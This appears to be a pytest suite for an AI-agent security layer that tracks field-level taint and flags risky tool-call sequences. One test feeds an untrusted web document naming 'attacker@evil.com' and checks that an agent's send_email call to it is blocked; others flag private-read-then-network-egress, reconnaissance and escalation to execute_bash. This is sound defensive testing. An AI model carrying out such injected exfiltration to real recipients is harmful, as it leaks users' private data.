"""Test suite for Sprint A: Field-Level Data Lineage & Behavioral Anomaly Engine.

Covers:
- TEST-LIN-01: Deep nested JSON dictionary tagging & JSON-pointer path mappings
- TEST-LIN-02: Conservative taint derivation on concatenated/transformed payloads
- TEST-LIN-03: Tainted tool argument detection and fine-grained gating
- TEST-BEH-01: Safe standard workflow sequence (NORMAL)
- TEST-BEH-02: Multi-step reconnaissance sequence (CRITICAL)
- TEST-BEH-03: Excessive invocation frequency & tool flooding (SUSPICIOUS)
- TEST-BEH-04: Dangerous read-to-egress state flip (CRITICAL)
- TEST-BEH-05: Sudden capability escalation jump (ANOMALOUS)
"""

import pytest

from aegis.behavioral_guard import BehavioralGuard
from aegis.data_lineage import DataLineageTracker
from aegis.policy_gate import PolicyGate
from aegis.risk_engine import RiskEngine
from aegis.taint import SessionContext
from aegis.types import (
    BehavioralState,
    Capability,
    FieldProvenance,
    FieldTrustLevel,
    PolicyVerdict,
    ToolCallProposal,
    TrustLevel,
)


@pytest.fixture
def lineage_tracker():
    return DataLineageTracker()


@pytest.fixture
def behavioral_guard():
    return BehavioralGuard()


@pytest.fixture
def policy_gate():
    return PolicyGate()


# ---------------------------------------------------------------------------
# TEST-LIN-01: Deep Nested Structure Tagging
# ---------------------------------------------------------------------------
def test_lin_01_nested_tagging(lineage_tracker):
    """TEST-LIN-01: Verify deep nested dictionaries and lists generate valid path mappings and hashes."""
    data = {
        "user": {
            "id": 1042,
            "profile": {
                "name": "Alice Developer",
                "emails": ["alice@corp.internal", "alice.dev@gmail.com"],
            },
        },
        "metadata": {
            "tier": "enterprise",
        },
    }

    lineage = lineage_tracker.tag_structure(
        data=data,
        trust=FieldTrustLevel.UNTRUSTED,
        source="web_search:api_response",
    )

    assert "root" in lineage
    assert "user.id" in lineage
    assert "user.profile.name" in lineage
    assert "user.profile.emails[0]" in lineage
    assert "user.profile.emails[1]" in lineage
    assert "metadata.tier" in lineage

    assert lineage["user.profile.name"].trust == FieldTrustLevel.UNTRUSTED
    assert lineage["user.profile.name"].source == "web_search:api_response"
    assert len(lineage["user.profile.name"].value_hash) == 64


# ---------------------------------------------------------------------------
# TEST-LIN-02: Conservative Taint Derivation on Transformation
# ---------------------------------------------------------------------------
def test_lin_02_conservative_taint_derivation(lineage_tracker):
    """TEST-LIN-02: Mixing trusted and untrusted inputs strictly produces DERIVED_UNTRUSTED."""
    # Setup initial session lineage
    trusted_data = {"user_prompt": "Please summarize this document: "}
    untrusted_data = {"retrieved_doc": "Confidential financial quarterly data."}

    session_lineage = {}
    session_lineage.update(lineage_tracker.tag_structure(trusted_data, FieldTrustLevel.TRUSTED, source="user_prompt"))
    session_lineage.update(lineage_tracker.tag_structure(untrusted_data, FieldTrustLevel.UNTRUSTED, source="pdf_retriever"))

    # Case A: Transform combining trusted and untrusted
    combined_val = trusted_data["user_prompt"] + untrusted_data["retrieved_doc"]
    out_prov = lineage_tracker.propagate_transform(
        input_paths=["user_prompt", "retrieved_doc"],
        output_path="combined_summary_prompt",
        output_value=combined_val,
        session_lineage=session_lineage,
    )

    assert out_prov.trust == FieldTrustLevel.DERIVED_UNTRUSTED
    assert out_prov.path == "combined_summary_prompt"

    # Case B: Transform combining only trusted inputs
    only_trusted_val = "Prefix: " + trusted_data["user_prompt"]
    pure_trusted_prov = lineage_tracker.propagate_transform(
        input_paths=["user_prompt"],
        output_path="pure_prompt",
        output_value=only_trusted_val,
        session_lineage=session_lineage,
    )

    assert pure_trusted_prov.trust == FieldTrustLevel.TRUSTED


# ---------------------------------------------------------------------------
# TEST-LIN-03: Tainted Tool Argument Detection
# ---------------------------------------------------------------------------
def test_lin_03_tainted_argument_inspection(lineage_tracker, policy_gate):
    """TEST-LIN-03: Verify tool arguments are inspected per-field and sensitive untrusted args are blocked."""
    session = SessionContext(
        user_root_intent="Send report to client",
        session_id="lin-test-session-001",
        is_tainted=True,
    )

    # Ingest tainted external email payload
    tainted_payload = {"malicious_recipient": "attacker@evil.com"}
    session_lineage = lineage_tracker.tag_structure(
        tainted_payload,
        FieldTrustLevel.UNTRUSTED,
        source="untrusted_web_doc",
    )
    session.record_field_provenance(session_lineage)

    # Tool call using the tainted recipient
    proposal = ToolCallProposal(
        tool_name="send_email",
        arguments={
            "recipient": "attacker@evil.com",
            "subject": "Quarterly Report",
        },
        source_trace_id=session.session_id,
        inferred_capability=Capability.SEND_EXTERNAL_MESSAGE,
    )

    decision = policy_gate.evaluate_tool_call(session=session, tool_proposal=proposal)

    assert decision.verdict == PolicyVerdict.BLOCK.value
    assert "Field-Level Taint Violation" in decision.reason or "recipient" in str(decision.field_lineage_violations)
    assert "recipient" in decision.field_lineage_violations or "malicious_recipient" in decision.field_lineage_violations or len(decision.field_lineage_violations) > 0


# ---------------------------------------------------------------------------
# TEST-BEH-01: Safe Standard Sequence (NORMAL)
# ---------------------------------------------------------------------------
def test_beh_01_safe_sequence(behavioral_guard):
    """TEST-BEH-01: Standard web_search -> summarize flow evaluates to NORMAL."""
    session_id = "safe-session-001"

    state1, score1, rules1 = behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.READ_PUBLIC,
        proposed_tool="web_search",
        user_intent="Search for the latest python release notes",
    )

    assert state1 == BehavioralState.NORMAL
    assert score1 == 0.0
    assert len(rules1) == 0


# ---------------------------------------------------------------------------
# TEST-BEH-02: Multi-Step Reconnaissance Sequence (CRITICAL)
# ---------------------------------------------------------------------------
def test_beh_02_reconnaissance_sequence(behavioral_guard):
    """TEST-BEH-02: web_search -> read_file -> http_request triggers CRITICAL reconnaissance rule."""
    session_id = "recon-session-001"

    # Step 1: web search
    behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.READ_PUBLIC,
        proposed_tool="web_search",
        user_intent="Find system info",
    )

    # Step 2: internal file read
    behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.READ_PRIVATE,
        proposed_tool="read_file",
        user_intent="Find system info",
    )

    # Step 3: external network egress
    state3, score3, rules3 = behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.NETWORK_EXTERNAL,
        proposed_tool="http_request",
        user_intent="Find system info",
    )

    assert state3 == BehavioralState.CRITICAL
    assert score3 >= 0.95
    assert any("BEH-04" in r or "Reconnaissance" in r for r in rules3)


# ---------------------------------------------------------------------------
# TEST-BEH-03: Excessive Tool Invocation Rate / Flooding (SUSPICIOUS)
# ---------------------------------------------------------------------------
def test_beh_03_tool_flooding(behavioral_guard):
    """TEST-BEH-03: Invoking the same write tool >5 times in 10s trips SUSPICIOUS loop detection."""
    session_id = "flood-session-001"

    for _ in range(5):
        behavioral_guard.evaluate_action_step(
            session_id=session_id,
            proposed_capability=Capability.WRITE_FILE,
            proposed_tool="write_log",
            user_intent="Log activity",
        )

    # 6th invocation within the sliding window
    state_6, score_6, rules_6 = behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.WRITE_FILE,
        proposed_tool="write_log",
        user_intent="Log activity",
    )

    assert state_6 == BehavioralState.SUSPICIOUS
    assert score_6 >= 0.60
    assert any("BEH-03" in r or "Excessive" in r for r in rules_6)


# ---------------------------------------------------------------------------
# TEST-BEH-04 & TEST-BEH-05: State Flip & Escalation Jumps
# ---------------------------------------------------------------------------
def test_beh_04_read_to_egress_flip(behavioral_guard):
    """TEST-BEH-04: READ_PRIVATE followed by NETWORK_EXTERNAL trips CRITICAL state flip."""
    session_id = "flip-session-001"

    behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.READ_PRIVATE,
        proposed_tool="read_customer_records",
        user_intent="Summarize customer feedback",
    )

    state, score, rules = behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.NETWORK_EXTERNAL,
        proposed_tool="post_data",
        user_intent="Summarize customer feedback",
    )

    assert state == BehavioralState.CRITICAL
    assert score >= 0.90
    assert any("BEH-01" in r or "Read-to-Egress" in r for r in rules)


def test_beh_05_capability_escalation_jump(behavioral_guard):
    """TEST-BEH-05: Baseline READ_PUBLIC suddenly invoking EXECUTE_CODE trips ANOMALOUS."""
    session_id = "jump-session-001"

    behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.READ_PUBLIC,
        proposed_tool="fetch_weather",
        user_intent="What is the weather today?",
    )

    state, score, rules = behavioral_guard.evaluate_action_step(
        session_id=session_id,
        proposed_capability=Capability.EXECUTE_CODE,
        proposed_tool="execute_bash",
        user_intent="What is the weather today?",
    )

    assert state == BehavioralState.ANOMALOUS
    assert score >= 0.80
    assert any("BEH-02" in r or "Escalation" in r for r in rules)
